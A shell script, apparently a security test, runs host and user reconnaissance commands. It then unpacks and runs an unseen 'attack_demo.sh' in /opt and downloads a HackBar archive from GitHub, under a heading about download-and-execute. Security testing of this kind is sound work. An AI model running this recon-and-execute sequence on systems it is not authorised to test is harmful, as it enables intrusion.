whoami
echo '1.1~~~~~~~~~~~~~~~~~~~~~~~'
uname -a
echo '1.2~~~~~~~~~~~~~~~~~~~~~~~'
uptime
echo '1.3~~~~~~~~~~~~~~~~~~~~~~~'
free
echo '1.4~~~~~~~~~~~~~~~~~~~~~~~'
python -V
echo '1.5~~~~~~~~~~~~~~~~~~~~~~~'
cat /proc/cpuinfo | grep "cpu cores" | uniq
echo '1.6~~~~~~~~~~~~~~~~~~~~~~~'
cat /proc/cpuinfo | grep 'model name' |uniq
echo '1.7~~~~~~~~~~~~~~~~~~~~~~~'
df -h
echo '1.8~~~~~~~~~~~~~~~~~~~~~~~'
echo '~~~~~~~~~~~~~~~~~~~1.System Information Leakage~~~~~~~~~~~~~~~~~'
who
echo '2.1~~~~~~~~~~~~~~~~~~~~~~~'
id
echo '2.2~~~~~~~~~~~~~~~~~~~~~~~'
w
echo '2.3~~~~~~~~~~~~~~~~~~~~~~~'
last -n 10
echo '2.4~~~~~~~~~~~~~~~~~~~~~~~'
lastlog
echo '2.5~~~~~~~~~~~~~~~~~~~~~~~'
ls -al
echo '2.6~~~~~~~~~~~~~~~~~~~~~~~'
echo '~~~~~~~~~~~~~~~~~~~2.User Information Leakage~~~~~~~~~~~~~~~~~~'
cd /opt
mkdir security_test_by_zlc
cd /opt/security_test_by_zlc
ls
echo '3.1~~~~~~~~~~~~~~~~~~~~~~~'
tar -zxvf attack_demo.tar.gz
ls
echo '3.2~~~~~~~~~~~~~~~~~~~~~~~'
chmod u+x attack_demo.sh
./attack_demo.sh
echo '3.3~~~~~~~~~~~~~~~~~~~~~~~'
aria2c
echo '3.4~~~~~~~~~~~~~~~~~~~~~~~'
curl - O https://codeload.github.com/GarbageCreater/HackBar/zip/master.zip
ls
echo '~~~~~~~~~~~~~~~~~~~3.Download And Execute Command~~~~~~~~~~~~~~~~~~'



































